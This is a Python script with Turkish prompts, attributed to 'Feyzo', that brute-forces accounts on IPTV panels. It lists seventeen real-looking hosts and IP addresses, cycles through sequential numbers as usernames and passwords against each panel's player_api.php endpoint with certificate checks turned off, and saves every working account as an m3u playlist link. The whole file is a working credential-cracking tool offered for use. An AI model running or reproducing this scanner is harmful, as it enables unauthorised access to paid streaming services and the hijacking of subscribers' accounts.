#pylint:disable=E0001
import os,pip
try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
	import requests
	
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
	
import random,time
import datetime
import pathlib
import subprocess


import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

ses= requests.Session()



subprocess.run(["clear", ""])
cpm=0
say=0
bul=0

feyzo=("""
\33[32m▰▰▰▰ᴘʏᴛʜᴏɴ 🅧-🅟🅡🅞-ᴘʏ ᴄᴏɴғɪɢ▰▰▰▰       \33[33m                 
╔══════════════════════════════════        
║████  ████ ██ ░░ ██ ██████ ░ ████ ░░░         
║██ ░░ ██ ░░ ██  ██ ░░░░ ██ ░██ ░██ ░░        
║████  ████ ░ ████ ░░░ ██ ░ ██ ░░░██ ░     
║██ ░░ ██ ░░░░ ██ ░░ ██ ░░░░ ██ ░██ ░░      
║██ ░░ ████ ░░ ██ ░░ ██████ ░ ████ ░░░        
╚══════════════════════════════════                   
\33[32m▰▰▰▰ 🅧-🅟🅡🅞-ᴘʏ ᴄᴏɴғɪɢ ▰▰▰▰             \33[0m""")
print(feyzo) 
#################
#input(print("\n\nLütfen Enter - Gönder - Tuşuna Basınız..?")) 
#subprocess.run(["clear", ""])
print("""
├───ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ ᶠᵉʸᶻᵒ────|

    0= PANEL ADINI KENDIM GIRECEM
    1= freeiptvgen.com:25461- Vpn
    2= thespeedmedia.watch:2088
    3= hdhd.tk:80
    4= tvdns.tech:80
    5= 51.222.82.89:8080
    6= androidtv33.xyz:80
    7= srvuhd.top:80
    8= 95.211.213.43:8080
    9= tv.factoryiptv.com:80
    10= amr4k.us:8080
    11= 185.71.64.167
    12= 163.172.103.202:8880
    13= oqab.life:8080
    14= client-urostream.club 
    15= xcui.vitvabc.xyz:8880
    16= pprotv.net:80
    17= tigeriptv.vip:8080

Sabit bir şifre için x yazın.!
""")
ssifre=""
sq=input("""Tanacak Panelin Numarasını Yazınız..?
\33[1mPanel No="""+"""\33[31m""")
if sq=="x":
	ssifre=input("""
Sabit bir şifre belirleyin. Şifre sabit kalacaktır taramada!
Şifre Girin=""")
	sq=input("""\33[0mTanacak Panelin Numarasını Yazınız..?
\33[1mPanel No="""+"""\33[31m""")
	urll="pprotv.net:80"
	bas=887000
if str(sq)=="1":
	urll="freeiptvgen.com:25461"
	bas=1000
if sq=="2":
	urll="thespeedmedia.watch:2086"
	bas=1000
if sq=="3":
	urll="hdhd.tk:80"
	bas=1000
if sq=="4":
	urll="tvdns.tech:80"
	bas=110000
if sq=="5" :
	urll="51.222.82.89:8080"
	bas=1000
if sq=="6" :
	urll="androidtv33.xyz:80"
	bas=100
if sq=="7":
	urll="srvuhd.top:80"
	bas=100
if sq=="8":
	urll="95.211.213.43:8080"
	bas=1000
if sq=="9":
	urll=" tv.factoryiptv.com:80"
	bas=1000
if sq=="10" :
	urll="amr4k.us:8080"
	bas=10
if sq=="11":
    urll="185.71.64.167"
    bas=2000
if sq=="12":
    urll="163.172.103.202:8880"
    bas=287994002500
if sq=="13":
	urll="oqab.life:8080"
	bas=90
if sq=="14":
	urll="client-urostream.club"
	bas=1
if sq=="15":
	urll="xcui.vitvabc.xyz:8880"
	bas=287994003000
if sq=="16":
	urll="pprotv.net:80"
	bas=887000
if sq=="17":
	urll="tigeriptv.vip:8080"
	bas=100
if sq=="0":
    urll=input("""
  Lütfen Panel Adını Yazınız..!
  Panel:Port=""")
    	
    bas=150115

try:
    urll=urll.replace("http://","")
except:
    quit() 

subprocess.run(["clear", ""])
print('\33[0m'+feyzo)     
#Başlanğıç Satırı @FeyzullahK
try:
    baslat=int(input("""
 Başlangıç sayısını yazın ve Enter basın...
 Önerlen:\33[33m"""+str(bas)+"""\33[0m
 
\33[1mCombo Başlanğıç Sayısı=\33[31m"""))
except:
    baslat=bas
bitir=5000000000000000000
if baslat =="" :
    baslat=1000
#Bitiş Satırı  Mr.Feyzo
if sq=="11":
    baslat=307211000000+baslat

 
#PortalPanel:Port merkeziptv.xyx:8080

#portal:port

panel=urll.replace(":","_")
def yaz(kullanici): 
    dosya=open('/sdcard/m3u@'+panel+'.txt','a+') 
    dosya.write(kullanici) 
    dosya.close() 

for i in range(baslat,bitir):
    userr=str(i)
    paswd=str(i)
    if sq=="1":
    	paswd="freeiptvgen"
    if not ssifre=="":
    	paswd=ssifre
    	
    	
    #if len(userr) ==1:
   # 	userr=str("000"+userr)
    	#pawd=str(userr+"000")
    #if len(userr) ==2:
    	#userr=str("00"+userr)
    	#pawd=str(userr+"000")
   # if len(userr) ==3:
   # 	userr=str("0"+userr)
    	#pawd=str(userr+"000")
    #paswd=userr[2:]+userr[:2]
    
    
    #paswd=""
#    for cx in range(0,len(userr)):
#    	paswd=userr[cx]+paswd
#    
    
    
    
    say = int(say) +1
    cpm=(time.time()-cpm)
    cpm=(round(60/cpm))
    print ("\33[0m" +userr+"-" + paswd +" \33[32m" +urll +'\033[96m\n' +"      >>>>>Total:" + str(say)+ "\33[33m Hit:" + str(bul)+"\33[94m Cpm:" +str(cpm)+"\033[0m")
    cpm=time.time()
    
    url3="http://"+urll+"/player_api.php?username="+userr+"&password="+paswd
    response = ses.get(url3, timeout=15, verify=False)
    veri=(str(response.text))
    if "active_cons" in veri:
    		file = pathlib.Path("/sdcard/kemik_sesi.mp3")
    		try:
    		  	if file.exists ():
    		  		ad.mediaPlay("/sdcard/kemik_sesi.mp3")
    		except:pass
        	#print(trh)
    		if 1==1:
    		    userm=userr
    		    pasdm=paswd
    		    panel=urll
    		    kanalsayisi=""
    		    url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
    		    res = ses.get(url5, timeout=15, verify=False)
    		    veri=str(res.text)
    		    if veri.count("stream_id")>1:
    		      	kanalsayisi=str(veri.count("stream_id"))
    		      	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
    		      	res = ses.get(url5, timeout=15, verify=False)
    		      	veri=str(res.text)
    		      	filmsayisi=str(veri.count("stream_id"))
    		      	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
    		      	res = ses.get(url5, timeout=15, verify=False)
    		      	veri=str(res.text)
    		      	dizisayisi=str(veri.count("series_id"))
            	
    		veri=(response.text)
    		acon=""
    		acon=veri.split('active_cons":')[1]
    		acon=acon.split(',')[0]
    		acon=acon.replace('"',"")
    		mcon=veri.split('max_connections":')[1]
    		mcon=mcon.split(',')[0]
    		mcon=mcon.replace('"',"")
    		status=veri.split('status":')[1]
    		status=status.split(',')[0]
    		status=status.replace('"',"")
    		timezone=veri.split('timezone":"')[1]
    		timezone=timezone.split('",')[0]
    		timezone=timezone.replace("\/","/")
    		realm=veri.split('url":')[1]
    		realm=realm.split(',')[0]
    		realm=realm.replace('"',"")
    		portal=panel
    		port=veri.split('port":')[1]
    		port=port.split(',')[0]
    		port=port.replace('"',"")
    		user=veri.split('username":')[1]
    		user=user.split(',')[0]
    		user=user.replace('"',"")
    		passw=veri.split('password":')[1]
    		passw=passw.split(',')[0]
    		passw=passw.replace('"',"")
    		bitis=veri.split('exp_date":')[1]
    		bitis=bitis.split(',')[0]
    		bitis=bitis.replace('"',"")
    		if bitis=="null":
            		bitis="Unlimited"
    		else:
            		bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
    		bitis=bitis
    		mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
    		sayi=""
    		mtl=""
    		mt=("""
╭─ᴘʏᴛʜᴏɴ ᴍᴏʙɪʟ ᴍ𝟹ᴜ ᴛᴀʀᴀᴍᴀ
├●🌐 Host ➤ http://"""+portal+"""
├●🌍 Real ➤ http://"""+realm+"""
├●📡 Port ➤ """+port+"""
├●👩‍ User ➤ """+user+"""
├●🔑 Pass ➤ """+passw+"""
├●📆 Exp. ➤ """+bitis+""" 
├●👩 Act Con ➤ """+acon+"""
├●👪 Max Con ➤ """+mcon+""" 
├●🌐 Status ➤ """+status+"""
├●⏰ TimeZone➤ """+timezone+"""
├──── 🅵🅴🆈🆉🅾️""")

    		if not kanalsayisi =="":
    			sayi=("""
├●🎬 Kanal Sayısı➤"""+kanalsayisi+"""
├●🎬 Film Sayısı➤"""+filmsayisi+"""
├●🎬 Dizi Sayısı➤"""+dizisayisi+"""
├──── @FeyzullahK""")
    		mtl=("""
├●🔗m3u_Url➤"""+mlink+"""
▰▰ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ ᶠᵉʸᶻᵒ▰▰
""")
    
    		
    		print(mt+sayi+mtl)

    		yaz(mt+sayi+mtl+'\n')
    		bul=int(bul)+1
    	
  